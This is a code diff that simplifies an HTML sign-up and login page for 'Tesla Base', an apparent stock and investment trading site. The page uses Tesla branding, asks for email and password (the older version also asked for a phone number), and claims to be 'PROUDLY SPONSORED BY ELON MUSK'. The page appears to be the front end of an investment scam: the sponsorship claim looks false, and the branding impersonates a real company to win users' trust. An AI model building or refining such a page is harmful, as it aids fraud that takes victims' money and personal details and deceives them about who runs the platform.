@@ -3,105 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Base | Global Trading & Investment</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Tesla Base | Trade & Invest</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        :root {
-            --primary: #e31937; /* Tesla Red */
-            --bg-dark: rgba(0, 0, 0, 0.75);
-            --glass: rgba(255, 255, 255, 0.1);
-        }
-
-        body, html {
-            margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif;
-            overflow: hidden; transition: 0.3s;
-        }
-
-        /* Background: Elon Musk & Tesla Branding */
-        .hero-bg {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://images.unsplash.com/photo-1617788138017-80ad40651399?q=80&w=2070') no-repeat center center/cover;
-            filter: brightness(0.4); z-index: -1;
-        }
-
-        .overlay-text {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 15vw; color: rgba(255, 255, 255, 0.05);
-            font-weight: 900; pointer-events: none; text-transform: uppercase;
-        }
-
-        .auth-container {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; backdrop-filter: blur(8px);
-        }
-
-        .login-card {
-            background: var(--bg-dark); padding: 40px; border-radius: 20px;
-            border: 1px solid var(--glass); width: 350px; text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        .tesla-logo { color: var(--primary); font-size: 2.5rem; font-weight: bold; letter-spacing: 5px; margin-bottom: 5px; }
-        .sub-text { color: #888; font-size: 0.9rem; margin-bottom: 30px; }
-
-        input {
-            width: 100%; padding: 12px; margin: 8px 0; background: #111;
-            border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box;
-        }
-
-        .btn-main {
-            width: 100%; padding: 14px; margin-top: 15px; border: none;
-            border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s;
-        }
-        .btn-login { background: white; color: black; }
-        .btn-signup { background: var(--primary); color: white; margin-top: 10px; }
-
-        /* World Translator */
-        #google_translate_element { position: absolute; top: 20px; right: 20px; z-index: 100; }
-
-        /* Dark/Light Mode Toggle */
-        .mode-toggle { position: absolute; top: 20px; left: 20px; cursor: pointer; color: #fff; background: var(--glass); padding: 10px; border-radius: 50%; }
-        
-        .proud-sponsor { position: absolute; bottom: 20px; color: #666; font-size: 0.8rem; letter-spacing: 1px; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: sans-serif; overflow: hidden; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1617788138017-80ad40651399?q=80&w=2070') no-repeat center center/cover; filter: brightness(0.3); z-index: -1; }
+        .auth-card { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.85); padding: 40px; border-radius: 20px; border: 1px solid #e31937; width: 320px; text-align: center; color: white; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-red { background: #e31937; color: white; }
+        #google_translate_element { position: absolute; top: 20px; right: 20px; }
     </style>
 </head>
-<body class="dark-mode">
-
-    <div class="hero-bg"></div>
-    <div class="overlay-text">TESLA</div>
-
+<body>
+    <div class="bg"></div>
     <div id="google_translate_element"></div>
-
-    <div class="mode-toggle" onclick="toggleTheme()">🌓</div>
-
-    <div class="auth-container">
-        <div class="login-card">
-            <div class="tesla-logo">TESLA</div>
-            <div class="sub-text">Stock • Investment • Trading</div>
-
-            <input type="email" id="email" placeholder="Email Address">
-            <input type="text" id="phone" placeholder="Phone Number">
-            <input type="password" id="password" placeholder="Secure Password">
-
-            <button onclick="handleAuth('login')" class="btn-main btn-login">Login</button>
-            <button onclick="handleAuth('signup')" class="btn-main btn-signup">Create Account</button>
-            
-            <p style="color: #555; font-size: 11px; margin-top: 20px;">Secure One-Email-One-Account Protection Enabled.</p>
-        </div>
-
-        <div class="proud-sponsor">PROUDLY SPONSORED BY ELON MUSK</div>
+    <div class="auth-card">
+        <h1 style="color:#e31937; margin:0;">TESLA</h1>
+        <p style="font-size: 12px; color: #888;">STOCK • INVESTMENT • TRADING</p>
+        <input type="email" id="email" placeholder="Email Address">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="handleAuth('login')" class="btn btn-red">Login</button>
+        <button onclick="handleAuth('signup')" class="btn" style="background:white; color:black;">Create Account</button>
+        <p style="font-size: 10px; margin-top: 20px;">PROUDLY SPONSORED BY ELON MUSK</p>
     </div>
-
     <script src="app.js"></script>
-    <script type="text/javascript">
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
-        }
-        function toggleTheme() {
-            document.body.classList.toggle('light-mode');
-        }
-    </script>
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script>function googleTranslateElementInit(){new google.translate.TranslateElement({pageLanguage:'en'},'google_translate_element');}</script>
 </body>
 </html>
